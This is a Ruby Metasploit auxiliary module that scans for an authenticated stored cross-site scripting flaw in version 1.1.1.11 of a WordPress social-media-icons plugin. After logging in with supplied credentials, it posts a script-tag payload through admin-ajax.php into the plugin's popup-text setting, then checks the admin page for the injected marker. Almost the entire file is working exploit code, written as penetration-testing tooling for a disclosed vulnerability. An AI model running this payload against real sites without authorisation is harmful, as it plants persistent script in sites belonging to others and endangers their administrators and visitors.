##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Social Media and Share Icons XSS Scanner',
      'Description' => %q{
        This module attempts to exploit an Authenticated Cross-Site Scripting in Social
        Media and Share Icons Plugin for WordPress, version 1.1.1.11 and likely prior in order if the
        instance is vulnerable.
      },
      'Author'      => [
        'g0blin', # Vulnerability Discovery
        'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
      ],
      'License'     => MSF_LICENSE,
      'References'  => [
        ['WPVDB', '8231'],
        ['URL', 'https://research.g0blin.co.uk/g0blin-00052/']
      ],
      'DisclosureDate' => 'Nov 22 2015'
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASS', [true, 'A valid password', nil])
      ], self.class
    )
  end

  def check
    check_plugin_version_from_readme('ultimate-social-media-icons', '1.1.1.12')
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASS']
  end

  def send_xss(cookie, xss)
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
      'vars_post' => {
        'action'                    => 'updateSrcn7',
        'sfsi_popup_text'           => "'\"><script>alert(#{xss})</script>",
        'sfsi_Show_popupOn'         => 'everypage',
        'sfsi_Shown_popupOnceTime'  => ''
      },
      'cookie'    => cookie
    )

    if res && res.code == 200 && res.body.include?('success')
      vprint_status("#{peer} - Sending payload with success.")
      return true
    else
      print_error("#{peer} - Not trigged XSS.")
      return nil
    end
  end

  def run_host(ip)
    xss = Rex::Text.rand_text_numeric(8)
    vprint_status("#{peer} - Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    fail_with(Failure::NoAccess, "#{peer} - Unable to login as: #{user}") if cookie.nil?

    fail_with(Failure::Unknown, "#{peer} - Unable to send xss") if send_xss(cookie, xss).nil?

    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => normalize_uri(wordpress_url_backend, 'admin.php'),
      'vars_get'  => {
        'page'    => 'sfsi-options'
      },
      'cookie'    => cookie
    )

    if res && res.code == 200 && res.body.include?("#{xss}")
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the Ultimate Social Media 1.1.1.11 plugin for WordPress")
      p = store_local(
        'wp_ultimate_social_media.http',
        'text/html',
        res.body,
        "#{xss}"
      )
      print_good("Save in: #{p}")
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
